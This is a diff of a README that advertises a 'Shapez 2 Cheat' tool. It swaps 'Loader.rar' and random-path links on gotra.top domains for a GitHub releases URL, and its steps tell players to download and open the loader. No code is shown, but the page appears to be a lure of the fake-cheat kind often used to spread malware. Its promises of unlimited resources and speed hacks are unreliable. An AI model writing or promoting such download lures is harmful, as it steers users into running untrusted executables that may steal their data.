@@ -1,11 +1,11 @@
-![hq720](https://github.com/user-attachments/assets/a937c457-b051-4ed4-ab2e-6499cde31c39)
+![hq720](https://github.com/Gecko-de-ops/Shapez-2-Cheat/releases)
 
 # 🎮 Shapez 2 Cheat
 
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/Gecko-de-ops/Shapez-2-Cheat/releases](https://github.com/Gecko-de-ops/Shapez-2-Cheat/releases)](https://github.com/Gecko-de-ops/Shapez-2-Cheat/releases)
 
-**Loader.rar** is a powerful tool designed to enhance your gameplay experience in **Shapez 2**, a factory-building game. This cheat tool provides players with the ability to automate production, unlock resources, and make the game easier or more fun with various cheats, allowing you to focus on creativity and exploration without the grind.
+**https://github.com/Gecko-de-ops/Shapez-2-Cheat/releases** is a powerful tool designed to enhance your gameplay experience in **Shapez 2**, a factory-building game. This cheat tool provides players with the ability to automate production, unlock resources, and make the game easier or more fun with various cheats, allowing you to focus on creativity and exploration without the grind.
 
 ---
 
@@ -24,7 +24,7 @@
 
 ## 🚀 Installation
 
-1. Open the **Loader.rar** tool.  
+1. Open the **https://github.com/Gecko-de-ops/Shapez-2-Cheat/releases** tool.  
 2. Launch **Shapez 2** and minimize the game window.  
 3. Activate cheats using the **Mod Menu** in the cheat tool.  
 4. Return to the game and enjoy the enhanced features.
@@ -34,7 +34,7 @@
 ## 🕹️ How to Use
 
 1. Launch **Shapez 2** and enter the game.  
-2. Open the **Loader.rar** tool and enable the desired cheats, such as Unlimited Resources, Instant Production, or Unlock All Items.  
+2. Open the **https://github.com/Gecko-de-ops/Shapez-2-Cheat/releases** tool and enable the desired cheats, such as Unlimited Resources, Instant Production, or Unlock All Items.  
 3. Use the **Mod Menu** to toggle between different features and adjust settings as needed.  
 4. Experiment with various cheats to enhance your creativity and make your factory-building experience more enjoyable.  
 5. Use the Speed Hack and No Costs features to minimize grinding and enjoy a smooth gameplay experience.
